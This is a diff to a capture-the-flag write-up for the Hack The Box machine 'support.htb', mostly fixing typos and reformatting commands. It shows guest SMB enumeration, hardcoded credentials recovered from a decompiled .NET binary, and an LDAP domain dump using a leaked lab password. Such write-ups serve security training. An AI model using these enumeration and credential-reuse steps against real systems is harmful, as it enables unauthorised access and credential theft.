@@ -108,7 +108,7 @@ smbclient  -U Guest --no-pass //10.10.11.174/support-tools                      
 session setup failed: NT_STATUS_LOGON_FAILURE
 ```
 
-But Guess empty pass did for some shares...
+But Guest empty pass did for some shares...
 ```bash
 smbclient  -U Guest --password="" //10.10.11.174/IPC$                           1 ⨯
 Try "help" to get a list of possible commands.
@@ -142,10 +142,10 @@ smb: \> dir
                 4026367 blocks of size 4096. 968811 blocks available
 smb: \>
 ```
-Downloading all the files locally, the UserInfo is a dotnet binary, so after moving it to a windows machine to decompile it with dnspy. It has hardcoded credentials. 
+Downloading all the files locally, the UserInfo is a dotnet binary, so after moving it to a windows machine to decompile it with dnspy, we fin that it has hardcoded credentials. 
 
 
-## Looking Hardcoded Credentials 
+## Hardcoded Credentials 
 ```csharp
 using System;
 using System.Text;
@@ -213,12 +213,29 @@ public LdapQuery()
 
 
 ## Dump the LDAP domain 
+
 ```bash
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch \
+    -x \
+    -H ldap://<IP> \
+    -D '<DOMAIN>\<username>' \
+    -w '<password>' \
+    -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
 ```
 ```bash
-lapsearch -x -H ldap://dc.support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
-ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
+lapsearch \
+    -x \
+    -H ldap://dc.support.htb \
+    -D 'support\ldap' \
+    -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
+    -b "CN=Users,DC=SUPPORT,DC=HTB" | \
+tee ldap_dc.support.htb.txt
+```
+```bash
+ldapdomaindump \
+    -u 'support\ldap' \
+    -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
+    dc.support.htb
 ```
 
 ## Plaintext credentials in the LDAP records
